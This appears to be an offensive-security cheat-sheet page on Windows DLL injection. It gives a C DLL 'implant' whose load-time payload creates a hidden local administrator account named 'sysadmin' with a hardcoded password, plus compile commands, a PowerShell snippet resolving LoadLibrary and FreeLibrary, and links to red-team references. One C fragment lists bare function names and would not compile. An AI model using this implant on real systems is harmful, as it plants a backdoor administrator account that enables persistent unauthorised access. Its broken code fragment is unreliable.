# DLL Injection

```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
	    // add payload
        system("cmd.exe /k net user sysadmin Password1234! /add & net localgroup Administrators sysadmin /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```
$ x86_64-w64-mingw32-gcc -shared -o implant.dll implant.c
```

Loads a dynamic-link library (DLL) module into the address space of the calling process.

```c
#include <windows.h>
#include <libloaderapi.h>

#pragma comment(lib, "kernel32.lib")

LoadLibrary
LoadLibraryA
```

```
$ x86_64-w64-mingw32-gcc -l kernel32 -o implant.exe implant.c
```

## PowerShell

```powershell
$Win32Functions = New-Object System.Object

$LoadLibraryAddress = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddress, $LoadLibraryDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

$FreeLibraryAddress = Get-ProcAddress kernel32.dll FreeLibrary
$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddress, $FreeLibraryDelegate)
$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
```

---
## References

### Tenouk

- [Tenouk: Dynamic Link Library - Part 1](https://www.tenouk.com/ModuleBB.html)

- [Tenouk: Dynamic Link Library - Part 2](https://www.tenouk.com/ModuleCC.html)

- [Tenouk: Windows DLL - A Supplementary Note](https://www.tenouk.com/cbbccfunction.html)

### Red Team Notes

- [Red Team Notes: Executing Code as a Control Panel Item through an Exported Cplapplet Function](https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function)

- [Red Team Notes: Code Execution through Control Panel Add-ins](https://www.ired.team/offensive-security/code-execution/code-execution-through-control-panel-add-ins)